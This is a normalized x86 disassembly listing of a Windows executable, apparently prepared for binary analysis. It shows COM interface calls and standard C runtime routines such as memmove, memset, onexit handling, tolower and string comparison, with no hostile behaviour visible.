mov eax [ esp + 0x18 ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x1c ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push edx
lea edx [ esp + 0x78 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x78 ] ebx
je r-xdata
lea ecx [ esp + 0x9c ]
call sub_412a66
cmp [ esp + 0x7c ] ebx
je r-xdata
push [ esp + 0x78 ]
call [ lstrlenW@IAT ]
mov ecx [ esp + 0x78 ]
push 0x12530264
lea edi [ esp + 0x54 ]
call sub_4011e8
lea eax [ esp + 0x80 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x50 ]
call sub_40120a
mov edi [ esp + 0x44 ]
cmp edi ebx
je r-xdata
push [ esp + 0x7c ]
call [ CoTaskMemFree@IAT ]
push [ esp + 0x78 ]
call [ CoTaskMemFree@IAT ]
mov esi [ esp + 0x68 ]
push 0x8
pop eax
push ebx
lea ecx [ esp + 0x84 ]
push ecx
lea ecx [ esp + 0x6c ]
mov [ esp + 0x28 ] 0x8ba39d9
mov [ esp + 0x2c ] 0x4
mov [ esp + 0x2d ] eax
call sub_4060be
push ebx
lea eax [ esp + 0x24 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0x5c ]
mov [ esp + 0x31 ] esi
call sub_4060be
lea esi [ esp + 0x54 ]
call sub_405f3e
lea esi [ esp + 0x64 ]
call sub_405f3e
add [ esp + 0x14 ] edi
cmp [ esp + 0x14 ] 0x15f90
jb r-xdata
cmp [ esp + 0x40 ] ebx
je r-xdata
lea ecx [ esp + 0x9c ]
call sub_412a66
test al al
je r-xdata
mov esi [ esp + 0xb4 ]
push ebx
push [ esp + 0x44 ]
mov eax edi
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x38 ] 0x6036f71f
mov [ esp + 0x3c ] 0x8
mov [ esp + 0x3d ] edi
call sub_4060be
push ebx
lea eax [ esp + 0x34 ]
push eax
push 0xd
pop eax
lea ecx [ esp + 0xa8 ]
mov [ esp + 0x41 ] esi
call sub_4060be
mov [ esp + 0x14 ] ebx
sub_412d60
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_412de4 ]
jmp [ ecx * 4 + jump_table_412e64 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412ed0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41306c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_412f70 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41306c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_412ed0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41306c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412ed0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412ed0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_412ed0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41306c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41306c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41306c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4130d0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_415221
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_413155
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_41550b
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4154bd
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4154bd
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_41320b
mov edi edi
push esi
push 0x4
push 0x20
call sub_415471
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_41323c
push 0xc
push r--data
call sub_415830
call sub_415581
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_413155
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413272
mov eax [ ebp - 0x1c ]
call sub_415875
retn
sub_413290
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_413314 ]
jmp [ ecx * 4 + jump_table_413394 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413400 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_41359c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4134a0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41359c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_413400 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_41359c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413400 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413400 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_413400 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41359c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41359c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_41359c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_4135f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4165ec
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4163c3
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_415c42
mov [ esi + 0x4 ] eax
sub_413678
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_4135f1
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_4168b0
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_4168df
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_413749
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_4169a0
lea esi [ eax + 0x1 ]
push esi
call sub_415315
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_416934
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_4137a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_413749
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4137ce
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_413789
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_413749
jmp r-xdata
sub_41380e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_413789
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41314a
pop ecx
sub_413835
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_4137ce
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41385a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4165ec
mov esi [ eax + 0x80 ]
call sub_4165ec
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x80 ] ecx
mov eax esi
pop esi
pop ebp
retn
sub_41388e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41387e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41314a
pop ecx
sub_4138af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_416b30
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_4138cf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_4130d0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_413290
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_416d42
mov eax esi
jmp r-xdata
sub_413944
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea eax [ edx + edx - 0x1 ]
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_414e18 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
